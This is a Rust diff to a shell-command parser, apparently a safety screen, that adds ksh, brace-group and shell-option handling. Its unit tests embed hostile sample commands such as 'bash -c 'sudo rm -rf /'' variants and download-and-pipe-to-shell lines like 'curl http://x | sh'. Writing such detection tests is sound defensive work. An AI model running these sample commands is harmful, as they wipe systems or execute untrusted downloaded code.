@@ -76,7 +76,7 @@ fn executable_is(segment: &Segment, names: &[&str]) -> bool {
 }
 
 fn is_shell(segment: &Segment) -> bool {
-    executable_is(segment, &["sh", "bash", "zsh", "dash"])
+    executable_is(segment, &["sh", "bash", "zsh", "dash", "ksh"])
 }
 
 fn extract_recursive(
@@ -97,10 +97,11 @@ fn extract_recursive(
     let mut nested = Vec::new();
     let mut ambiguous_command_word = false;
     for (index, raw) in raw_segments.iter().enumerate() {
+        let pipe_from_previous = raw.pipe_from_previous || (index == 0 && incoming_pipe);
         nested.extend(
             nested_commands(&raw.command)?
                 .into_iter()
-                .map(|command| (command, false)),
+                .map(|(command, inherits_pipe)| (command, inherits_pipe && pipe_from_previous)),
         );
         let argv = shell_words::split(raw.command.trim()).map_err(|_| ())?;
         if argv.is_empty() {
@@ -114,13 +115,12 @@ fn extract_recursive(
             ambiguous_command_word = true;
             continue;
         }
-        let pipe_from_previous = raw.pipe_from_previous || (index == 0 && incoming_pipe);
         output.push(Segment {
             argv: argv.clone(),
             pipe_from_previous,
         });
 
-        if let Some(inner) = shell_inner_command(&argv) {
+        if let Some(inner) = shell_inner_command(&argv)? {
             nested.push((inner.to_string(), false));
         }
         if let Some(inner) = shell_here_string(&argv)? {
@@ -574,7 +574,7 @@ fn shell_here_string(argv: &[String]) -> Result<Option<String>, ()> {
     let executable = argv
         .first()
         .and_then(|value| value.rsplit(['/', '\\']).next());
-    if !matches!(executable, Some("sh" | "bash" | "zsh" | "dash")) {
+    if !matches!(executable, Some("sh" | "bash" | "zsh" | "dash" | "ksh")) {
         return Ok(None);
     }
     for (index, value) in argv.iter().enumerate() {
@@ -611,7 +611,7 @@ fn extract_here_docs(command: &str) -> Result<(String, Vec<String>), ()> {
         let shell_receives_body = argv
             .first()
             .and_then(|value| value.rsplit(['/', '\\']).next())
-            .is_some_and(|value| matches!(value, "sh" | "bash" | "zsh" | "dash"));
+            .is_some_and(|value| matches!(value, "sh" | "bash" | "zsh" | "dash" | "ksh"));
         index += 1;
         let body_start = index;
         while index < lines.len() && lines[index].trim() != delimiter {
@@ -687,6 +687,7 @@ fn split_top_level(command: &str) -> Result<Vec<RawSegment>, ()> {
     let mut quote = None;
     let mut escaped = false;
     let mut paren_depth = 0usize;
+    let mut brace_depth = 0usize;
     let mut incoming_pipe = false;
 
     while index < chars.len() {
@@ -733,9 +734,13 @@ fn split_top_level(command: &str) -> Result<Vec<RawSegment>, ()> {
             ')' => {
                 paren_depth = paren_depth.checked_sub(1).ok_or(())?;
             }
+            '{' if is_brace_group_start(&chars, index) => brace_depth += 1,
+            '}' if brace_depth > 0 && is_brace_group_end(&chars, index) => {
+                brace_depth = brace_depth.checked_sub(1).ok_or(())?;
+            }
             _ => {}
         }
-        if paren_depth == 0 {
+        if paren_depth == 0 && brace_depth == 0 {
             let delimiter_len = delimiter_len(&chars, index);
             if delimiter_len > 0 {
                 let text: String = chars[start..index].iter().collect();
@@ -749,7 +754,7 @@ fn split_top_level(command: &str) -> Result<Vec<RawSegment>, ()> {
         index += 1;
     }
 
-    if escaped || quote.is_some() || paren_depth != 0 {
+    if escaped || quote.is_some() || paren_depth != 0 || brace_depth != 0 {
         return Err(());
     }
     let text: String = chars[start..].iter().collect();
@@ -791,7 +796,7 @@ fn push_raw_segment(output: &mut Vec<RawSegment>, command: String, pipe_from_pre
     }
 }
 
-fn nested_commands(command: &str) -> Result<Vec<String>, ()> {
+fn nested_commands(command: &str) -> Result<Vec<(String, bool)>, ()> {
     let chars: Vec<char> = command.chars().collect();
     let mut commands = Vec::new();
     let mut index = 0;
@@ -835,19 +840,25 @@ fn nested_commands(command: &str) -> Result<Vec<String>, ()> {
         }
         if ch == '`' {
             let end = find_backtick_end(&chars, index + 1)?;
-            commands.push(chars[index + 1..end].iter().collect());
+            commands.push((chars[index + 1..end].iter().collect(), false));
             index = end + 1;
             continue;
         }
         if ch == '$' && chars.get(index + 1) == Some(&'(') {
             let end = find_closing_paren(&chars, index + 1)?;
-            commands.push(chars[index + 2..end].iter().collect());
+            commands.push((chars[index + 2..end].iter().collect(), false));
             index = end + 1;
             continue;
         }
         if ch == '(' && is_command_group_start(&chars, index) {
             let end = find_closing_paren(&chars, index)?;
-            commands.push(chars[index + 1..end].iter().collect());
+            commands.push((chars[index + 1..end].iter().collect(), true));
+            index = end + 1;
+            continue;
+        }
+        if ch == '{' && is_brace_group_start(&chars, index) {
+            let end = find_closing_brace(&chars, index)?;
+            commands.push((chars[index + 1..end].iter().collect(), true));
             index = end + 1;
             continue;
         }
@@ -912,6 +923,47 @@ fn find_closing_paren(chars: &[char], open: usize) -> Result<usize, ()> {
     Err(())
 }
 
+fn find_closing_brace(chars: &[char], open: usize) -> Result<usize, ()> {
+    let mut depth = 1usize;
+    let mut quote = None;
+    let mut escaped = false;
+    let mut index = open + 1;
+    while index < chars.len() {
+        let ch = chars[index];
+        if escaped {
+            escaped = false;
+            index += 1;
+            continue;
+        }
+        if ch == '\\' && quote != Some(Quote::Single) {
+            escaped = true;
+            index += 1;
+            continue;
+        }
+        match quote {
+            Some(Quote::Single) if ch == '\'' => quote = None,
+            Some(Quote::Double) if ch == '"' => quote = None,
+            Some(Quote::Backtick) if ch == '`' => quote = None,
+            Some(_) => {}
+            None => match ch {
+                '\'' => quote = Some(Quote::Single),
+                '"' => quote = Some(Quote::Double),
+                '`' => quote = Some(Quote::Backtick),
+                '{' if is_brace_group_start(chars, index) => depth += 1,
+                '}' if is_brace_group_end(chars, index) => {
+                    depth -= 1;
+                    if depth == 0 {
+                        return Ok(index);
+                    }
+                }
+                _ => {}
+            },
+        }
+        index += 1;
+    }
+    Err(())
+}
+
 fn is_command_group_start(chars: &[char], index: usize) -> bool {
     if index > 0 && chars[index - 1] == '$' {
         return false;
@@ -920,16 +972,87 @@ fn is_command_group_start(chars: &[char], index: usize) -> bool {
         .iter()
         .rev()
         .find(|value| !value.is_whitespace())
-        .is_none_or(|value| matches!(value, ';' | '&' | '|' | '('))
+        .is_none_or(|value| matches!(value, ';' | '&' | '|' | '(' | '{'))
 }
 
-fn shell_inner_command(argv: &[String]) -> Option<&str> {
-    let executable = argv.first()?.rsplit(['/', '\\']).next()?;
-    if !matches!(executable, "sh" | "bash" | "zsh" | "dash") {
-        return None;
+fn is_brace_group_start(chars: &[char], index: usize) -> bool {
+    is_command_group_start(chars, index)
+        && chars
+            .get(index + 1)
+            .is_none_or(|value| value.is_whitespace())
+}
+
+fn is_brace_group_end(chars: &[char], index: usize) -> bool {
+    chars[..index]
+        .iter()
+        .rev()
+        .find(|value| !value.is_whitespace())
+        .is_some_and(|value| matches!(value, ';' | '&' | '\n' | '{'))
+        && chars
+            .get(index + 1)
+            .is_none_or(|value| value.is_whitespace() || matches!(value, ';' | '&' | '|'))
+}
+
+fn shell_inner_command(argv: &[String]) -> Result<Option<&str>, ()> {
+    let Some(executable) = argv
+        .first()
+        .and_then(|value| value.rsplit(['/', '\\']).next())
+    else {
+        return Ok(None);
+    };
+    if !matches!(executable, "sh" | "bash" | "zsh" | "dash" | "ksh") {
+        return Ok(None);
     }
-    argv.windows(2)
-        .find_map(|pair| matches!(pair[0].as_str(), "-c" | "-lc").then_some(pair[1].as_str()))
+    let mut index = 1;
+    while let Some(value) = argv.get(index) {
+        let plus_option = shell_plus_option_consumes_operand(value);
+        if value == "--" || (!value.starts_with('-') && !plus_option) || value == "-" {
+            return Ok(None);
+        }
+
+        let consumes_operand = matches!(
+            value.as_str(),
+            "-o" | "+o" | "-O" | "+O" | "--rcfile" | "--init-file"
+        ) || plus_option
+            || (value.starts_with('-')
+                && !value.starts_with("--")
+                && value
+                    .strip_prefix('-')
+                    .is_some_and(|options| options.contains('o')));
+        let runs_command = shell_option_runs_command(value);
+        index += 1;
+        if consumes_operand {
+            argv.get(index).ok_or(())?;
+            index += 1;
+        }
+        if runs_command {
+            return argv.get(index).map(String::as_str).map(Some).ok_or(());
+        }
+    }
+    Ok(None)
+}
+
+fn shell_plus_option_consumes_operand(value: &str) -> bool {
+    let Some(options) = value.strip_prefix('+') else {
+        return false;
+    };
+    !options.is_empty()
+        && (options.contains('o') || options.contains('O'))
+        && options
+            .chars()
+            .all(|option| "abcCDefhiklmnopqrstuvxBEHOPT".contains(option))
+}
+
+fn shell_option_runs_command(value: &str) -> bool {
+    let Some(options) = value.strip_prefix('-') else {
+        return false;
+    };
+    !options.is_empty()
+        && !options.starts_with('-')
+        && options.contains('c')
+        && options
+            .chars()
+            .all(|option| "abcCDefhiklmnopqrstuvxBEHPT".contains(option))
 }
 
 fn is_windows_command(command: &str) -> bool {
@@ -993,10 +1116,142 @@ mod tests {
     }
 
     #[test]
+    fn extracts_commands_from_combined_shell_options_containing_c() {
+        for option in ["-xc", "-ec", "-xec", "-lc"] {
+            let command = format!("bash {option} 'sudo rm -rf /'");
+            let extracted = extract_command_segments(&command);
+            assert!(extracted.parse_ok, "{command:?}: {extracted:?}");
+            assert!(
+                executable_names(&command).iter().any(|name| name == "sudo"),
+                "{command:?}: {extracted:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn shell_command_options_only_run_arguments_before_a_script() {
+        for command in ["bash -x -c 'sudo rm -rf /'", "bash -xc 'sudo rm -rf /'"] {
+            let extracted = extract_command_segments(command);
+            assert!(extracted.parse_ok, "{command:?}: {extracted:?}");
+            assert!(
+                executable_names(command).iter().any(|name| name == "sudo"),
+                "{command:?}: {extracted:?}"
+            );
+        }
+
+        for command in [
+            "bash script.sh -c 'sudo rm -rf /'",
+            "bash -x script.sh -c 'sudo rm -rf /'",
+            "bash -- -c 'sudo rm -rf /'",
+        ] {
+            let extracted = extract_command_segments(command);
+            assert!(extracted.parse_ok, "{command:?}: {extracted:?}");
+            assert!(
+                !executable_names(command).iter().any(|name| name == "sudo"),
+                "{command:?}: {extracted:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn shell_command_options_skip_their_operands_before_c() {
+        for command in [
+            "bash -o pipefail -c 'sudo rm -rf /'",
+            "bash +o errexit -c 'sudo rm -rf /'",
+            "bash --rcfile startup.bash -c 'sudo rm -rf /'",
+            "bash --init-file startup.bash -xc 'sudo rm -rf /'",
+            "bash -xo pipefail -c 'sudo rm -rf /'",
+            "bash -oc pipefail 'sudo rm -rf /'",
+        ] {
+            let extracted = extract_command_segments(command);
+            assert!(extracted.parse_ok, "{command:?}: {extracted:?}");
+            assert!(
+                executable_names(command).iter().any(|name| name == "sudo"),
+                "{command:?}: {extracted:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn combined_plus_shell_options_skip_their_operands_before_c() {
+        for command in [
+            "bash +ox pipefail -c 'sudo rm -rf /'",
+            "bash +xO extglob -c 'sudo rm -rf /'",
+            "ksh +ox pipefail -c 'sudo rm -rf /'",
+        ] {
+            let extracted = extract_command_segments(command);
+            assert!(extracted.parse_ok, "{command:?}: {extracted:?}");
+            assert!(
+                executable_names(command).iter().any(|name| name == "sudo"),
+                "{command:?}: {extracted:?}"
+            );
+        }
+
+        for command in [
+            "bash +ox pipefail -- -c 'sudo rm -rf /'",
+            "bash +ox pipefail script.sh -c 'sudo rm -rf /'",
+        ] {
+            let extracted = extract_command_segments(command);
+            assert!(extracted.parse_ok, "{command:?}: {extracted:?}");
+            assert!(
+                !executable_names(command).iter().any(|name| name == "sudo"),
+                "{command:?}: {extracted:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn shell_options_with_missing_operands_fail_closed() {
+        for command in [
+            "bash -o",
+            "bash +o",
+            "bash --rcfile",
+            "bash --init-file",
+            "bash -oc pipefail",
+            "bash +ox",
+            "ksh +xO",
+            "ksh -c",
+        ] {
+            let extracted = extract_command_segments(command);
+            assert!(!extracted.parse_ok, "{command:?}: {extracted:?}");
+            assert_eq!(structural_flags(&extracted), vec![UNCLASSIFIABLE]);
+        }
+    }
+
+    #[test]
+    fn ignores_shell_options_that_do_not_run_the_following_argument() {
+        for command in [
+            "bash -x 'sudo rm -rf /'",
+            "bash --norc 'sudo rm -rf /'",
+            "bash --rcfile 'sudo rm -rf /'",
+        ] {
+            let extracted = extract_command_segments(command);
+            assert!(extracted.parse_ok, "{command:?}: {extracted:?}");
+            assert!(
+                !executable_names(command).iter().any(|name| name == "sudo"),
+                "{command:?}: {extracted:?}"
+            );
+        }
+
+        let safe = extract_command_segments("bash -xc 'printf safe'");
+        assert!(safe.parse_ok, "{safe:?}");
+        assert!(
+            safe.segments
+                .iter()
+                .filter_map(executable_basename)
+                .any(|name| name == "printf"),
+            "{safe:?}"
+        );
+    }
+
+    #[test]
     fn flags_any_input_piped_to_shell() {
         for command in [
             "curl http://x | sh",
             "wget -qO- x | bash -s",
+            "curl http://x | ksh",
+            "curl http://x | (sh)",
+            "curl http://x | ((bash))",
             "curl http://x $(echo suffix) | sh",
             "sh -c 'curl http://x | dash'",
             "printf 'sudo id\\n' | sh",
@@ -1009,6 +1264,44 @@ mod tests {
             let extracted = extract_command_segments(command);
             assert!(structural_flags(&extracted).is_empty(), "{command:?}");
         }
+    }
+
+    #[test]
+    fn flags_input_piped_to_shell_inside_brace_groups() {
+        for command in [
+            "curl http://x | { sh; }",
+            "curl http://x | { { bash; }; }",
+            "curl http://x | { (dash); }",
+        ] {
+            let extracted = extract_command_segments(command);
+            assert_eq!(
+                structural_flags(&extracted),
+                vec![PIPE_TO_SHELL],
+                "{command:?}: {extracted:?}"
+            );
+        }
+
+        for command in [
+            "curl http://x | { sh;",
+            "curl http://x | { (sh; }",
+            "{ { sh; }",
+            "curl http://x | ({ { ksh; }; })",
+        ] {
+            let extracted = extract_command_segments(command);
+            assert!(!extracted.parse_ok, "{command:?}: {extracted:?}");
+            assert_eq!(structural_flags(&extracted), vec![UNCLASSIFIABLE]);
+        }
+    }
+
+    #[test]
+    fn ksh_wrappers_extract_inner_commands() {
+        let command = "ksh -o pipefail -c 'sudo id'";
+        let extracted = extract_command_segments(command);
+        assert!(extracted.parse_ok, "{extracted:?}");
+        assert!(
+            executable_names(command).iter().any(|name| name == "sudo"),
+            "{extracted:?}"
+        );
     }
 
     #[test]
